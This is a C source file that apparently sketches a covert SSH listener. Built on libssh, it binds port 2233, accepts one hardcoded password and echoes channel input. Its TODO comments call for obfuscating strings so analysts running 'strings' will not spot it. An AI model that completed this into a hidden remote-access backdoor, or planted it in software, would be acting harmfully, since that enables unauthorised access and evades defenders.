#include <libssh/libssh.h>
#include <libssh/server.h>
#include <stdio.h>
#include <string.h>

const int SUCCESS = 1;
const int FAILURE = 0;
const int ERROR = -1;

static int auth_password(const char *username, const char *password) {
    int result = FAILURE;

    if(!strcmp(username, "ssh_user") && !strcmp(password, ("somePassword"))) {
        result = SUCCESS;
    }

    return result;
}

static int authMessage(ssh_message message) {
    int response = FAILURE;

    if(ssh_message_subtype(message) == SSH_AUTH_METHOD_PASSWORD) {
        if(auth_password(ssh_message_auth_user(message), ssh_message_auth_password(message))) {
            response = SUCCESS;
            ssh_message_auth_reply_success(message, 0);
        }
    }

    else {
        ssh_message_auth_set_methods(message, SSH_AUTH_METHOD_PASSWORD);
        ssh_message_reply_default(message);
    }

    return response;
}

static int authenticate(ssh_session sesh) {
    int authed = 0;
    ssh_message message;

    while(!authed) {
        message = ssh_message_get(sesh);

        if(!message) {
            break;
        }

        switch(ssh_message_type(message)) {
            case SSH_REQUEST_AUTH:
                authed = authMessage(message);
                break;
            default:
                ssh_message_reply_default(message);
        }

        ssh_message_free(message);
    }

    return authed;
}

static ssh_channel openChannel(ssh_session sesh) {
    ssh_message message;
    ssh_channel chan;

    do {
        message = ssh_message_get(sesh);

        if(message) {
            if(ssh_message_type(message) == SSH_REQUEST_CHANNEL_OPEN && ssh_message_subtype(message) == SSH_CHANNEL_SESSION) {
                chan = ssh_message_channel_request_open_reply_accept(message);
                break;
            } 
            
            else {
                ssh_message_reply_default(message);
            }
        }        

        ssh_message_free(message);
    } while(message && !chan);
    
    return chan;
}

static int openShell(ssh_session sesh) {
    ssh_message message;
    int shellRequested = 0;

    do {
        message = ssh_message_get(sesh);

        if(message) {
            if(ssh_message_type(message) == SSH_REQUEST_CHANNEL && ssh_message_subtype(message) == SSH_CHANNEL_REQUEST_SHELL) {
                ssh_message_channel_request_reply_success(message);
                shellRequested = 1;
                break;
            } 
            
            else {
                ssh_message_reply_default(message);
            }
        }        

        ssh_message_free(message);
    } while(message && !shellRequested);
    
    return shellRequested;
}

static void setOptions(ssh_bind bind) {
    ssh_bind_options_set(bind, SSH_BIND_OPTIONS_BINDPORT_STR, "2233");
    ssh_bind_options_set(bind, SSH_BIND_OPTIONS_HOSTKEY, "host_key"); // TODO: You'll be wanting to obfuscate this string to make it less obvious when an analyst runs `strings` against it
}

static int readMessages(ssh_channel chan) {
    char buffer[2048];
    int i = 0;
    int result = 0;

    do {
        i = ssh_channel_read(chan, buffer, 2048, 0);

        if(i > 0) {
            ssh_channel_write(chan, buffer, i);

            if(write(1, buffer, i) < 0) {
                printf("ERROR buffer\n");
                result = ERROR;
            }
        }
    } while(i > 0);

    return result;
}

int main(int argc, char **argv) {
    ssh_session sesh;
    ssh_bind bind;
    ssh_message message;
    ssh_channel chan = 0;
    int shell = 0;
    int errorState = 0;

    bind = ssh_bind_new();
    sesh = ssh_new();

    setOptions(bind);
    
    errorState = ssh_bind_listen(bind);

    if(errorState) {
        printf("ERROR on listen\n");  // TODO: This will want to be obfuscated/removed too
        return ERROR;
    }

    errorState = ssh_bind_accept(bind, sesh);

    if(errorState == SSH_ERROR) {
        printf("ERROR on accept\n");  // TODO: This will want to be obfuscated/removed too
        return ERROR;
    }

    if(ssh_handle_key_exchange(sesh)) {
        printf("ERROR on KEx\n");  // TODO: This will want to be obfuscated/removed too
        return ERROR;
    }

    if(!authenticate(sesh)) {
        printf("ERROR auth\n");
        ssh_disconnect(sesh);
        return ERROR;
    }

    chan = openChannel(sesh);

    if(!chan) {
        printf("ERROR channel\n");
        ssh_finalize();
        return ERROR;
    }

    if(!openShell(sesh)) {
        printf("WARN No shell requested\n");
        return ERROR;
    }

    printf("Connected\n");

    errorState = readMessages(chan);

    ssh_disconnect(sesh);
    ssh_bind_free(bind);

    ssh_finalize();

    return 0;
}